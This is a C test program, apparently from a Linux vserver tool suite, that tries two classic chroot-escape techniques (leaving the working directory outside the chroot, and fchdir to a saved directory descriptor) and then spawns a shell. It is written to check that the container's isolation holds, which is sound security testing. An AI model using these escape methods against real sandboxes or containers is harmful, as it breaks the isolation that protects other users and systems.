// $Id$

// Copyright (C) 2003 Enrico Scholz <enrico.scholz@informatik.tu-chemnitz.de>
// based on tests/escaperoot.cc by Jacques Gelinas
//  
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 2, or (at your option)
// any later version.
//  
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//  
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

/*
	This program tries to escape out of a vserver using chroot flaws.
	Once escaped, it exec a shell.

	None of this works on 2.4.13.
*/
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <wait.h>
#include <limits.h>

static void print_pwd()
{
	char path[PATH_MAX];
	if (getcwd(path,sizeof(path)-1)!=NULL){
		printf ("PWD: %s\n",path);
	}
}
/*
	Just set a chroot in a sub-directory and keep the
	current directory behind
*/
static void test1()
{
	printf ("test1\n");
	print_pwd();
	mkdir ("dummy_dir",0755);
	if (chroot ("dummy_dir")==-1){
		fprintf (stderr,"Can't chroot into dummy_dir (%s)\n",strerror(errno));
	}else{
	        int i;
		// Try to chdir into the real root
		for (i=0; i<1000; i++) chdir("..");
		print_pwd();
		if (execl ("/bin/sh","/bin/sh",NULL)==-1){
			fprintf (stderr,"execl /bin/sh failed (%s)\n",strerror(errno));
		}
	}
}

/*
	Same as test1, except we open the current directory and do
	a fchdir() to it before trying to escape to the real root.
*/
static void test2()
{
	printf ("test2\n");
	print_pwd();
	mkdir ("dummy_dir",0755);
	int fd = open (".",O_RDONLY);
	if (fd == -1){
		fprintf (stderr,"Can't open current directory (%s)\n",strerror(errno));
	}else if (chroot ("dummy_dir")==-1){
		fprintf (stderr,"Can't chroot into dummy_dir (%s)\n",strerror(errno));
	}else if (fchdir(fd)==-1){
		fprintf (stderr,"Can't fchdir to the current directory (%s)\n"
			,strerror(errno));
	}else{
	        int i;
		// Try to chdir into the real root
		for (i=0; i<1000; i++) chdir("..");
		print_pwd();
		if (execl ("/bin/sh","/bin/sh",NULL)==-1){
			fprintf (stderr,"execl /bin/sh failed (%s)\n",strerror(errno));
		}
	}
}

/*
	Perform the test in a sub-process so it won't affect the current one
*/
static void dotest (void (*f)())
{
	pid_t pid = fork();
	if (pid == 0){
		f();
		_exit (0);
	}else if (pid == -1){
		fprintf (stderr,"Can't fork (%s)\n",strerror(errno));
	}else{
		int status;
		wait (&status);
	}
}

int main ()
{
	dotest (test1);
	dotest (test2);
	printf ("All attempts failed\n");
	return 0;
}


